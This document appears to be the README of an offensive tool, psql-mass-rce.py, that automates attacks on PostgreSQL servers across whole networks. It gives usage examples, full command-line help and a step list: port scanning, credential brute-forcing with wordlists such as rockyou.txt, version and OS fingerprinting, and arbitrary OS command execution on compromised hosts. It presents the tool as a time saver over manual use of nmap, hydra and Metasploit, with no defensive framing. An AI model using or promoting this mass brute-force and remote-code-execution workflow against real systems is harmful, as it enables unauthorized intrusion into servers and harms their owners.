Conviniently invoke RCE on PostgreSQL servers in network
=======

How does it work?
--------
Few examples to give you an idea:   

| Example | Comment |
|---------|---------|
| `./psql-mass-rce.py 10.1.1.10 192.168.0.100-150 --port 5433` | Accepts any number of any targets |
| `./psql-mass-rce.py 10.1.1.100/31 ./psql.gnmap --passfile rockyou.txt` | Accepts IP subnets and .gnmap files |
| `./psql-mass-rce.py -iL ./targets.txt --userfile users.txt` | Load IP[:port] from local file (nmap-alike) |


Scripts does the following:
1. Checks if port is open
2. Bruteforces credentials (using built-in dictionary or user files)
3. Determines PostgreSQL version and OS
4. Executes RCE if database user has enough rights

Live hosts with good credentials are saved to session file. After reconnaissance you may want to run RCE on those:   
`./psql-mass-rce.py --saved --command 'whoami'`   


Installation:
--------
`pip3 install -r requirements.txt`


Which PostgreSQL versions can give me RCE?
--------
PostgreSQL verions 9 and 10 (version 8 is in development).


Any zero-days inside?
--------
Not yet. [Technique](http://dsrbr.blogspot.ru/2015/04/os-command-execution-in-postgresql-93.html) was published almost 3 years ago.


Will it save my time?
--------
Definately yes.

| Before 	| After 	|
|--------	|-------	|
| 1. run nmap for port scanning<br/>2. run patator/hydra to bruteforce credentials<br/>3. run psql binary to connect and check version<br/>4. copy-paste payloads, or launch MSF `postgres_payload` manually at each host.     | ./psql-mass-rce.py 10.1.1.0/24 |


Full help:
--------
```
psql-mass-rce v0.1

Usage: psql-mass-rce.py targets [--userfile USERFILE] [--passfile PASSFILE]
               [--command COMMAND] [--port PORT] [--saved]

Necessary arguments:
  targets              Accepts any number of these: IP, network, or .gnmap file

Optional arguments:
  -h, --help           show this help message and exit
  --userfile USERFILE  File with a list of users
  --passfile PASSFILE  File with a list of passwords
  --command COMMAND    Command to execute on a target machine
  --port PORT          Port to connect
  --saved              Work on targets from saved session file
```
